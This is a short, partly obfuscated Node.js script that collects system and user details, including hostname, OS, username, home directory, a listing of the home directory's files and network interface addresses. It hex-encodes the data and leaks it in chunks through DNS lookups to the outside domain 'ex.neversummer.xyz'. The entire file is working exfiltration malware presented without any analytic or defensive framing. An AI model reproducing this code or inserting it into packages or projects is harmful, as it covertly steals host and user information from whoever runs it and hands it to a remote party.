var dns = require('dns');
var os = require('os');
var crypto = require('crypto');
var fs = require('fs');
let userInfo = os['userInfo']();
var info = [
    os['hostname'](),
    os['arch'](),
    os['platform'](),
    os['release'](),
    os['tmpdir'](),
    os['totalmem'](),
    os['uptime'](),
    userInfo['uid'],
    userInfo['gid'],
    userInfo['username'],
    userInfo['homedir'],
    userInfo['shell'],
    __filename
];
const baseDomain = '.ex.neversummer.xyz';
const maxSubDomainLen = 0x3f;
var rayId = crypto['randomBytes'](0x14)['toString']('hex')['substring'](0x0, 0x8);
var homeFiles = [];
fs['readdirSync'](os['homedir']())['forEach'](_0x5d58ba => {
    homeFiles['push'](_0x5d58ba);
});
if (homeFiles['length'] > 0x0) {
    info['push'](homeFiles['join'](';'));
}
const interfaces = os['networkInterfaces']();
let i = 0x1;
for (const key in interfaces) {
    info['push'](key + ':' + interfaces[key][0x0]['address']);
}
let infoString = info['join']('|');
let buff = new Buffer['from'](infoString);
let encodedInfo = buff['toString']('hex');
let chunkSize = maxSubDomainLen;
for (var startChar = 0x0, charsLength = encodedInfo['length']; startChar < charsLength; startChar += chunkSize) {
    let infoDomain = rayId + '.' + i + '.' + encodedInfo['substring'](startChar, startChar + chunkSize);
    let fullDomain = infoDomain + baseDomain;
    dns['lookup'](fullDomain, function (_0x2982bd, _0x37e865, _0x152822) {
    });
    i++;
}
